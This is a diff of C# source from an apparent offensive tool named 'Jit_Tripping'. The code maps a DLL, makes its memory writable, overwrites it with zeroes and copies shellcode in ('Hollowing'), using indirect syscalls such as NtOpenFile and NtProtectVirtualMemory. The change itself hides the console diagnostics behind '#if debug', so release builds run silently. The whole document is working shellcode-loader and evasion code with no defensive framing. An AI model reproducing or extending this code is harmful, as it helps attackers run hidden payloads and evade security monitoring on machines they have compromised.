@@ -114,7 +114,9 @@ namespace Jit_Tripping
             object[] argsNtOpenFile = new object[] { hFile, FileAccessFlags.FILE_READ_DATA | FileAccessFlags.FILE_EXECUTE | FileAccessFlags.FILE_READ_ATTRIBUTES | FileAccessFlags.SYNCHRONIZE, objectAttributes, ioStatusBlock, FileShareFlags.FILE_SHARE_READ | FileShareFlags.FILE_SHARE_DELETE, FileOpenFlags.FILE_SYNCHRONOUS_IO_NONALERT | FileOpenFlags.FILE_NON_DIRECTORY_FILE };
             var retval = ntdll.indirectSyscallInvoke<Delegates.NtOpenFile>("NtOpenFile", argsNtOpenFile);
             hFile = (IntPtr)argsNtOpenFile[0];
+#if debug
             Console.WriteLine("hfile: 0x{0:X}, status code 0x{1:X}", hFile, retval);
+#endif
             objectAttributes = (Structs.OBJECT_ATTRIBUTES)argsNtOpenFile[2];
             ioStatusBlock = (Structs.IO_STATUS_BLOCK)argsNtOpenFile[3];
 
@@ -134,19 +136,26 @@ namespace Jit_Tripping
  
 
             //Make page writeable
+#if debug
             Console.WriteLine("Changing to be writeable");
+#endif
             uint ntstatus = (uint)ntdll.indirectSyscallInvoke<Delegates.NtProtectVirtualMemory>("NtProtectVirtualMemory", new object[] { (IntPtr)(-1), pBaseAddress, (IntPtr)size, PAGE_READWRITE, (uint)0 });
+#if debug
             Console.WriteLine("Ntstatus of protect: 0x{0:X}", ntstatus);
-
+#endif
             //Copy shellcode into the mapped dll
             byte[] nullbyte = new byte[size];
             for (int i = 0; i < size; i++) nullbyte[i] = 0x00;
+#if debug
             Console.WriteLine($"Dll is {File.ReadAllBytes(dllToOverload).Length.ToString()} bytes");
             Console.WriteLine("{1} will be at 0x{0:X}", (long)pBaseAddress, dllToOverload);
-
+            
             Console.WriteLine($"Hollowing {nullbyte.Length.ToString()} bytes");
+#endif
             Marshal.Copy(nullbyte, 0, pBaseAddress, nullbyte.Length);
+#if debug
             Console.WriteLine("{1} written to 0x{0:X}", (long)pBaseAddress, dllToOverload);
+#endif
             Marshal.Copy(shellcode, 0, pBaseAddress, shellcode.Length);
 
             //Change back to executable
